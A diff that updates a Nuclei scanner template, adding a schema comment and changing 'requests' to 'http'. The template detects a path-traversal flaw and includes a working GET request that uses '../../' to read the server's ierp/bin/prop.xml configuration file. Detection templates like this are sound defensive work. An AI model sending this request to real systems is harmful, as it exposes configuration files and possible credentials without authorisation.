@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wooyun-path-traversal
 info:
   name: Wooyun Path Traversal
@@ -9,7 +10,7 @@ info:
     (affecting a large number of well-known school government and enterprise cases
     such as COFCO/Minsheng E-commerce/Tsinghua University/Aigo)
   tags: lfi,wooyun
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml"
